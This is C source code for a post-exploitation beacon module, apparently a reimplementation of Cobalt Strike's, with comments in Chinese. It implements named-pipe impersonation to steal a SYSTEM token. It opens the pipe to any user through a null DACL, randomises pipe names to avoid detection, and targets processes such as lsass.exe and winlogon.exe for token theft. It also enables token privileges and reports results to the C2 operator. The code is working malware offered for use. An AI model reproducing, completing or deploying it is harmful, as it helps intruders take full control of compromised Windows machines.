/*
 * 权限提升模块 - Privilege Escalation Module
 * 
 * 功能说明：
 * 1. 通过命名管道技术实现权限提升，获取SYSTEM权限
 * 2. 智能检测和启用进程所需权限
 * 3. 支持令牌窃取和模拟，绕过UAC限制
 * 4. 兼容x86/x64架构，提供跨平台支持
 * 5. 增强隐蔽性，减少被检测风险
 */
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <psapi.h>
#include "commands.h"
#include "parse.h"
#include "beacon.h"
#include "bformat.h"
#include "tokens.h"

static HANDLE hServerPipe    = INVALID_HANDLE_VALUE;
static HANDLE systemToken    = INVALID_HANDLE_VALUE;
static HANDLE hElevateThread = INVALID_HANDLE_VALUE;
extern HANDLE atoken;
extern int    threadcount;

// 随机生成管道名称，增加隐蔽性
void generate_random_pipe_name(char* pipeName, int maxLen) {
    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    int nameLen = 8 + (rand() % 8); // 8-15字符长度
    
    strcpy_s(pipeName, maxLen, "\\\\.\\pipe\\");
    int prefixLen = strlen(pipeName);
    
    for (int i = 0; i < nameLen && (prefixLen + i) < (maxLen - 1); i++) {
        pipeName[prefixLen + i] = charset[rand() % (sizeof(charset) - 1)];
    }
    pipeName[prefixLen + nameLen] = '\0';
}

// 检查当前进程是否具有管理员权限
BOOL is_elevated() {
    BOOL isElevated = FALSE;
    HANDLE token = NULL;
    
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
        TOKEN_ELEVATION elevation;
        DWORD size;
        
        if (GetTokenInformation(token, TokenElevation, &elevation, sizeof(elevation), &size)) {
            isElevated = elevation.TokenIsElevated;
        }
        CloseHandle(token);
    }
    return isElevated;
}

// 智能选择目标进程进行令牌窃取
BOOL find_system_process(DWORD* targetPID) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return FALSE;
    
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    // 优先选择系统服务进程
    const char* systemProcesses[] = {"winlogon.exe", "lsass.exe", "services.exe", "spoolsv.exe"};
    
    if (Process32First(snapshot, &pe32)) {
        do {
            for (int i = 0; i < sizeof(systemProcesses) / sizeof(systemProcesses[0]); i++) {
                if (_stricmp(pe32.szExeFile, systemProcesses[i]) == 0) {
                    *targetPID = pe32.th32ProcessID;
                    CloseHandle(snapshot);
                    return TRUE;
                }
            }
        } while (Process32Next(snapshot, &pe32));
    }
    
    CloseHandle(snapshot);
    return FALSE;
}

/*
 * 工作线程：处理命名管道模拟攻击
 * 创建命名管道服务器并模拟连接的第一个客户端
 */
void elevate_thread() {
    BYTE bMessage[128] = {0};
    DWORD dwBytes = 0;
    DWORD dwTimeout = 30000; // 30秒超时
    OVERLAPPED overlap = {0};
    
    // 创建事件对象用于异步操作
    overlap.hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
    if (!overlap.hEvent) goto cleanup;
    
    // 等待客户端连接（带超时）
    BOOL connected = FALSE;
    DWORD startTime = GetTickCount();
    
    while (!connected && (GetTickCount() - startTime) < dwTimeout) {
        if (ConnectNamedPipe(hServerPipe, &overlap)) {
            connected = TRUE;
        } else {
            DWORD error = GetLastError();
            if (error == ERROR_PIPE_CONNECTED) {
                connected = TRUE;
            } else if (error == ERROR_IO_PENDING) {
                // 异步等待连接
                if (WaitForSingleObject(overlap.hEvent, 1000) == WAIT_OBJECT_0) {
                    DWORD transferred;
                    if (GetOverlappedResult(hServerPipe, &overlap, &transferred, FALSE)) {
                        connected = TRUE;
                    }
                }
            } else {
                Sleep(100); // 短暂延迟后重试
            }
        }
    }
    
    if (!connected) goto cleanup;
    
    // 必须先从管道读取数据才能模拟客户端
    if (!ReadFile(hServerPipe, &bMessage, 1, &dwBytes, NULL)) {
        goto cleanup;
    }
    
    // 模拟连接到我们的客户端（通过服务获取SYSTEM用户权限）
    if (!ImpersonateNamedPipeClient(hServerPipe)) {
        goto cleanup;
    }
    
    // 从当前线程获取SYSTEM令牌
    if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &systemToken)) {
        // 如果失败，尝试复制令牌
        HANDLE tempToken;
        if (OpenThreadToken(GetCurrentThread(), TOKEN_DUPLICATE, FALSE, &tempToken)) {
            DuplicateToken(tempToken, SecurityImpersonation, &systemToken);
            CloseHandle(tempToken);
        }
    }
    
cleanup:
    // 清理资源
    if (overlap.hEvent) {
        CloseHandle(overlap.hEvent);
    }
    
    if (hServerPipe != INVALID_HANDLE_VALUE) {
        DisconnectNamedPipe(hServerPipe);
        CloseHandle(hServerPipe);
        hServerPipe = INVALID_HANDLE_VALUE;
    }
    
    // 减少线程计数
    threadcount--;
}

// 智能获取和启用权限
void getprivs(char * buffer, int length, HANDLE token, formatp * output) {
    int x;
    TOKEN_PRIVILEGES priv = {0};
    datap parser;
    unsigned short count;
    char privName[64];
    DWORD lastError;
    
    // 初始化解析器
    data_init(&parser, buffer, length);
    
    // 从缓冲区获取权限数量
    count = data_short(&parser);
    
    // 遍历权限列表
    for (x = 0; x < count; x++) {
        // 从缓冲区获取权限名称
        data_string(&parser, privName, 64);
        
        // 重置权限结构
        memset(&priv, 0, sizeof(priv));
        
        // 将用户指定的权限名称映射为值，失败则跳过
        if (!LookupPrivilegeValue(NULL, privName, &priv.Privileges[0].Luid)) {
            continue;
        }
        
        // 填充权限结构的其余部分
        priv.PrivilegeCount = 1;
        priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        
        // 调整权限，成功则报告
        if (AdjustTokenPrivileges(token, FALSE, &priv, 0, 0, 0)) {
            lastError = GetLastError();
            if (lastError == ERROR_SUCCESS) {
                bformat_printf(output, "[+] 成功启用权限: %s\n", privName);
            } else if (lastError == ERROR_NOT_ALL_ASSIGNED) {
                bformat_printf(output, "[!] 部分权限未分配: %s\n", privName);
            }
        } else {
            bformat_printf(output, "[-] 权限启用失败: %s (错误: %d)\n", privName, GetLastError());
        }
    }
}

/*
 * 提权预处理命令
 * 创建命名管道服务器和服务线程。当客户端连接到服务器时，
 * 线程会获取其访问令牌并进行模拟。
 */
void command_elevate_pre(char * buffer, int length) {
    char cServicePipe[256];
    SECURITY_ATTRIBUTES sa = {0};
    SECURITY_DESCRIPTOR sd = {0};
    
    // 参数长度检查
    if (length >= 256) {
        return;
    }
    
    // 如果没有提供管道名称，则随机生成一个
    if (length == 0) {
        generate_random_pipe_name(cServicePipe, sizeof(cServicePipe));
    } else {
        memcpy(cServicePipe, buffer, length);
        cServicePipe[length] = '\0';
    }
    
    // 重置状态变量
    systemToken = INVALID_HANDLE_VALUE;
    hServerPipe = INVALID_HANDLE_VALUE;
    hElevateThread = INVALID_HANDLE_VALUE;
    
    // 设置安全描述符，允许任何用户连接
    if (InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION)) {
        if (SetSecurityDescriptorDacl(&sd, TRUE, NULL, FALSE)) {
            sa.nLength = sizeof(SECURITY_ATTRIBUTES);
            sa.lpSecurityDescriptor = &sd;
            sa.bInheritHandle = FALSE;
        }
    }
    
    // 创建命名管道，增加错误处理
    hServerPipe = CreateNamedPipe(
        cServicePipe,
        PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED, // 支持异步操作
        PIPE_TYPE_MESSAGE | PIPE_WAIT,
        2,      // 最大实例数
        0,      // 输出缓冲区大小（系统默认）
        0,      // 输入缓冲区大小（系统默认）
        0,      // 超时时间（系统默认）
        &sa     // 安全属性
    );
    
    if (hServerPipe == INVALID_HANDLE_VALUE) {
        return;
    }
    
    // 创建线程等待管道连接
    hElevateThread = run_thread_start(reinterpret_cast<void (*)(void*)>(&elevate_thread), NULL);
    
    // 线程创建失败的清理
    if (hElevateThread == INVALID_HANDLE_VALUE) {
        CloseHandle(hServerPipe);
        hServerPipe = INVALID_HANDLE_VALUE;
    }
}

/*
 * 提权后处理步骤
 * 处理获取到的SYSTEM令牌
 */
void command_elevate_post(void(*callback)(char * buffer, int length, int type)) {
    HANDLE ttoken;
    char name[512];
    DWORD waitResult;
    
    // 等待提权线程完成（最多30秒）
    if (hElevateThread != INVALID_HANDLE_VALUE) {
        waitResult = WaitForSingleObject(hElevateThread, 30000);
        
        if (waitResult == WAIT_TIMEOUT) {
            // 超时则强制终止线程
            TerminateThread(hElevateThread, 0);
            callback("[!] 提权操作超时\n", 19, CALLBACK_OUTPUT);
        }
        
        CloseHandle(hElevateThread);
        hElevateThread = INVALID_HANDLE_VALUE;
    }
    
    // 处理新获取的令牌
    if (systemToken != INVALID_HANDLE_VALUE) {
        // 尝试在当前线程中使用SYSTEM令牌
        if (!ImpersonateLoggedOnUser(systemToken)) {
            // 如果直接模拟失败，尝试创建令牌副本
            HANDLE duplicatedToken = NULL;
            if (DuplicateTokenEx(systemToken, TOKEN_ALL_ACCESS, NULL, 
                               SecurityImpersonation, TokenPrimary, &duplicatedToken)) {
                if (ImpersonateLoggedOnUser(duplicatedToken)) {
                    CloseHandle(systemToken);
                    systemToken = duplicatedToken;
                } else {
                    CloseHandle(duplicatedToken);
                    post_error_d(0xc, GetLastError());
                    return;
                }
            } else {
                post_error_d(0xc, GetLastError());
                return;
            }
        }
        
        atoken = systemToken;
        
        // 获取令牌用户名信息
        if (token_user(systemToken, name, 512)) {
            char output[600];
            sprintf_s(output, sizeof(output), "[+] 成功获取权限令牌: %s\n", name);
            callback(output, strlen(output), CALLBACK_TOKEN_STOLEN);
        } else {
            callback("[+] 权限令牌获取成功\n", 24, CALLBACK_TOKEN_STOLEN);
        }
        
        // 验证提权是否成功
        if (is_elevated()) {
            callback("[+] 权限提升验证成功 - 当前具有管理员权限\n", 45, CALLBACK_OUTPUT);
        }
    }
    else {
        // 尝试从系统进程窃取令牌作为备选方案
        DWORD targetPID;
        if (find_system_process(&targetPID)) {
            char fallback[256];
            sprintf_s(fallback, sizeof(fallback), 
                     "[!] 管道提权失败，尝试从进程 %d 窃取令牌\n", targetPID);
            callback(fallback, strlen(fallback), CALLBACK_OUTPUT);
            
            // 这里可以添加进程令牌窃取逻辑
        } else {
            post_error_na(0x01);
        }
    }
}

/* 检测进程架构：64位还是32位？ */
BOOL is_wow64(HANDLE process) {
    BOOL (WINAPI *fnIsWow64Process)(HANDLE, PBOOL);
    BOOL bIsWow64 = FALSE;
    
    fnIsWow64Process = (BOOL (WINAPI *)(HANDLE, PBOOL)) GetProcAddress(
        GetModuleHandleA("kernel32"), "IsWow64Process");
    
    if (NULL != fnIsWow64Process) {
        if (!fnIsWow64Process(process, &bIsWow64)) {
            return FALSE;
        }
    }
    
    return bIsWow64;
}

/* 检测当前Beacon架构：x64还是x86？ */
BOOL is_x64() {
#if defined _M_X64
    return TRUE;
#elif defined _M_IX86
    return FALSE;
#endif
}

/* 智能权限获取命令 - 启用指定权限 */
void command_getprivs(char * buffer, int length, void(*callback)(char * buffer, int length, int type)) {
    HANDLE ttoken;
    formatp enabled;
    
    bformat_init(&enabled, 32 * 1024);
    
    // 首先检查当前权限状态
    if (!is_elevated()) {
        bformat_printf(&enabled, "[!] 警告: 当前不具有管理员权限，某些权限可能无法启用\n");
    }
    
    // 尝试在当前线程令牌上启用权限（如果可用）
    if (atoken != NULL) {
        bformat_printf(&enabled, "[*] 使用当前模拟令牌启用权限\n");
        
        // 暂时放弃令牌并重新模拟，确保获得应用权限的令牌副本
        token_guard_start();
        getprivs(buffer, length, atoken, &enabled);
        token_guard_stop();
    }
    // 尝试在当前进程令牌上启用权限（需要SE_DEBUG_PRIV等权限）
    else if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &ttoken)) {
        bformat_printf(&enabled, "[*] 使用当前进程令牌启用权限\n");
        getprivs(buffer, length, ttoken, &enabled);
        CloseHandle(ttoken);
    }
    else {
        bformat_printf(&enabled, "[-] 无法打开进程令牌 (错误: %d)\n", GetLastError());
        post_error_na(0x3b);
    }
    
    // 将输出发送回Cobalt Strike
    if (bformat_length(&enabled) > 0) {
        callback(bformat_string(&enabled), bformat_length(&enabled), CALLBACK_OUTPUT);
    } else {
        callback("[-] 未能启用任何权限\n", 23, CALLBACK_OUTPUT);
    }
    
    bformat_free(&enabled);
}